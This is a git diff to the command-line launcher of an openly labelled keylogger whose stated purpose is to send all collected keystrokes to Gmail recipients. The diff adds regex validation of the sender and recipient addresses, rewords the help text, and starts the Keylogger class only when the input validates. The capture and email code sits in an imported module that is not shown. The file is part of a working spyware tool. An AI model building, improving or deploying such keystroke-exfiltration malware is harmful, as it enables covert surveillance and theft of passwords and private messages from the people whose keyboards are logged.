@@ -3,6 +3,7 @@
 import signal
 import argparse
 import os
+import re
 
 from keylogger import Keylogger
 from termcolor import colored
@@ -19,13 +20,30 @@ signal.signal(signal.SIGINT, def_handler)
 
 def get_arguments():
     argparser = argparse.ArgumentParser(description="Keylogger that sends all collected keys to a Gmail.")
-    argparser.add_argument("-s", "--sender", required=True, dest="sender", help="Sender Gmail. (Ex: sender@gmail.com)")
+    argparser.add_argument("-s", "--sender", required=True, dest="sender", help="Gmail as sender. (Ex: sender@gmail.com)")
     argparser.add_argument("-r", "--recipients", required=True, dest="recipients", help="Recipients Gmail separated by a comma. (Ex: 'sender@gmail.com' | 'sender@gmail.com,sender1@gmail.com')")
-    argparser.add_argument("-p", "--password", required=True, dest="password", help="Password application made by the sender. (Ex: jklo oikj aswer)")
+    argparser.add_argument("-p", "--password", required=True, dest="password", help="Password used by the sender in the application. (Ex: jklo oikj aswer)")
 
     args = argparser.parse_args()
 
     return args.sender, args.password, args.recipients
+
+def verify_format(sender, recipients):
+    emailRegex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}$'
+    recipients = recipients.split(',')
+    rec = recipients
+    recipientsMatch = map(lambda recipt: re.match(emailRegex, recipt), recipients)
+
+    for recipient in recipientsMatch:
+        if not recipient:
+            recipientsMatch = False
+            break
+    else:
+        recipientsMatch = True
+
+    senderMatch = re.match(emailRegex, sender)
+
+    return recipientsMatch and senderMatch, rec
 
 def print_banner():
     print(colored("""
@@ -39,9 +57,13 @@ def main():
 
     print_banner()
     sender, password, recipients = get_arguments()
+    isValid, recipients = verify_format(sender, recipients)
 
-    keylogger = Keylogger(sender, password, recipients)
-    keylogger.start()
+    if isValid:
+        keylogger = Keylogger(sender, password,recipients)
+        keylogger.start()
+    else:
+        print(colored("\n[!] Incorrect argument format.\n", "red"))
 
 if __name__ == "__main__":
     main()
